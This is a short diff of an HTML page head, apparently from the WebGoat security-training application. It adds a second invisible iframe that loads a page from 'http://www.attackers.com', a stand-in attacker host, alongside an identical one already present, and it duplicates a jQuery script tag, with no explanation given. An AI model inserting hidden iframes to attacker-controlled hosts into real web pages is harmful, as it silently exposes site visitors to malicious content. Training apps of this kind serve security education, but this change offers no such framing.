@@ -19,9 +19,10 @@
         <link rel="stylesheet" href="css/main.css"/>
         <!--  end of CSS -->
         <iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
-
+    <iframe src='http://www.attackers.com' style='visibility: hidden;'></iframe>
     </style>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 </head>
 <body onload='document.loginForm.username.focus();'>
     <section id="container" ng-controller="goatLesson">
